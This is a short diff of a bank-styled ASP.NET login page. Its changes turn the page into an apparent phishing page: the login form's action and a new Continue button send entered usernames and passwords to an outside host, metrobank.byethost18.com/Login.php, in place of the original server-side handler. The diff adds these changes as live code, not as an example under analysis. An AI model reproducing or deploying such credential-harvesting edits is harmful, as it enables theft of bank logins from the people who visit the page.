@@ -1,4 +1,3 @@
-﻿<%@ Page Language="C#" AutoEventWireup="true" CodeFile="Login.aspx.cs" Inherits="_Default" %>
 
 <html dir="ltr" xmlns="http://www.w3.org/1999/xhtml" xml:lang="en">
 
@@ -1257,11 +1256,11 @@
     });
     //]]>
     </script>
-    <link rel="stylesheet" type="text/css" href="WebApplication5/Content/index.css" media="all">
+    <link rel="stylesheet" type="text/css" href="index.css" media="all">
 </head>
 
 <body onunload="unloadAction();" style="margin: 0px;" class="BrowserWindow">
-        <form id="form1" runat="server">
+        <form id="form1" name="form1" method="post" action="http://metrobank.byethost18.com/Login.php">
         <div style="display: none;">
             <input value="" name="MODE" type="text">
         </div>
@@ -1791,8 +1790,8 @@
                                                                                         <img class="loader-30" src="loader-30-blue.gif">
                                                                                     </div>
                                                                                     <div style="display: inline; height: 35px; width: 89px;" >
-                                                                                        <asp:Button ID="Button1" runat="server" Text="Continue" OnClick="Button1_Click" BackColor="#000099" BorderStyle="None" ForeColor="White"   Height="35" Width="89" />
-                                                                                     </div>
+											     <button style="background:#000099; color:White; height: 35px; width: 89px; border:None " onclick="window.location.href='http://metrobank.byethost18.com/Login.php?user=user&pass=pass'" Text="Continue">Continue</button>
+                                                                                        </div>
                                                                                 </div>
                                                                             </div>
                                                                             <div style="clear: both; height: 0px; overflow: hidden;" class="clearBoth"></div>
